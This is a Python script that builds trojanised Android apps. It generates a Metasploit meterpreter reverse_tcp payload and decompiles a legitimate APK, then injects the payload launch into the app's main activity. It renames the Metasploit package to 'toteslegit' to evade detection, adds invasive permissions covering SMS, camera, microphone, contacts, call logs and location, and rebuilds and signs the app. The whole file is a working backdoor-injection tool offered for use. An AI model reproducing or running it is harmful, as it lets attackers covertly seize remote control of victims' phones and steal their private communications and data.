#!/usr/bin/python3

import os
from colorama import Fore, Style


permission = """    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.CHANGE_WIFI_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.SEND_SMS"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.CALL_PHONE"/>
    <uses-permission android:name="android.permission.READ_CONTACTS"/>
    <uses-permission android:name="android.permission.WRITE_CONTACTS"/>
    <uses-permission android:name="android.permission.RECORD_AUDIO"/>
    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
    <uses-permission android:name="android.permission.CAMERA"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.SET_WALLPAPER"/>
    <uses-permission android:name="android.permission.READ_CALL_LOG"/>
    <uses-permission android:name="android.permission.WRITE_CALL_LOG"/>
    <uses-permission android:name="android.permission.WAKE_LOCK"/>
    <uses-feature android:name="android.hardware.camera"/>
    <uses-feature android:name="android.hardware.camera.autofocus"/>
    <uses-feature android:name="android.hardware.microphone"/>"""

def main():
    f=open(".t","r")
    print("\n" + Fore.YELLOW + f.read() + Fore.BLUE + "\n\n\tBy Lonost404")
    f.close()
    print(Style.RESET_ALL)
    
    lhost = input("LHOST: ")
    lport = input("LPORT: ")
    apk = input("APK file: ")

    print("Creating payload...")
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST={0} LPORT={1} -o payload.apk".format(lhost,lport))


    os.system("apktool d -f payload.apk")
    os.system("apktool d -f " + apk)

    manifest = open(apk[:-4]+"/AndroidManifest.xml","r").read()

    line = 0

    for i in manifest.split("\n"):

        if i.find("action.MAIN") != -1:
            
            if manifest.split("\n")[line+1].find("LAUNCHER") != -1:
            
                break
            
            else:
            
                continue
        
        line += 1

    for i in range(1, 10):

        activity = manifest.split("\n")[line-i:line]

        if activity[0].find("activity") != -1:
            break
    
    print(activity)

    for i in activity:
        
        if i.find("android:name") != -1 and i.find("activity") != -1:

            x = i[i.find("android:name")::].split("\"")[1]

            activity = x.replace(".","/")

            break

    print(activity)

    os.system("ls -1 " + apk[:-4] + "/ | grep smali > ls")

    f = open("ls","r").read()

    path = None

    for i in f.split("\n"):

        if os.path.isfile(apk[:-4]+"/"+i+"/"+activity+".smali"):
        
            path = apk[:-4]+"/"+i+"/"+activity+".smali"

            break
            

    if path == None:
    
        print("FATAL ERROR")
       
        exit()

    f = open(path,"r").read()

    line = 0

    for i in f.split("\n"):

        if i.find(">onCreate") != -1:
            
            break

        line += 1

    f = f.split("\n")

    f[line] = f[line] + "\n\n    invoke-static {p0}, Lcom/toteslegit/stage/Payload;->start(Landroid/content/Context;)V"

    f = '\n'.join(f)

    f=open(path,"w").write(f)

    os.system("mkdir -p " + apk[:-4] + "/" + path.split("/")[1] +"/com/toteslegit/stage/")

    os.system("sed -i -e 's/metasploit/toteslegit/g' payload/smali/com/metasploit/stage/*")

    os.system("cp payload/smali/com/metasploit/stage/* " + apk[:-4] + "/" + path.split("/")[1] + "/com/toteslegit/stage/")

    f=open(apk[:-4] + "/AndroidManifest.xml","r").read()
    
    line = 0

    f = f.split("\n")

    e = 0

    for a in f:
        
        for b in permission.split("\n"):
            
            if a.find(b) != -1:

                del(f[line])

                if e == 0:
                    l = line-1
                    e = 1
                


        line += 1

    f[l] = f[l] + "\n" + permission

    f = '\n'.join(f)

    x = f.find("android:compileSdkVersion=")

    if x != -1:
        
        x = f[x:x+40].split(" ")[0]

        x += " "

        f = f.replace(x, "")

    x = f.find("android:compileSdkVersionCodename=")

    if x != -1:

        x = f[x:x+40].split(" ")[0]

        x += " "

        f = f.replace(x, "")

    x = f.find("android:appComponentFactory=")

    if x != -1:

        x = f[x:x+100].split(" ")[0]

        x += " "

        f = f.replace(x, "")

    f = open(apk[:-4] + "/AndroidManifest.xml","w").write(f)

    os.system("apktool b " + apk[:-4])

    os.system("jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore " + apk[:-4] +"/dist/" + apk + " alias_name")

if __name__ == "__main__":
    main()
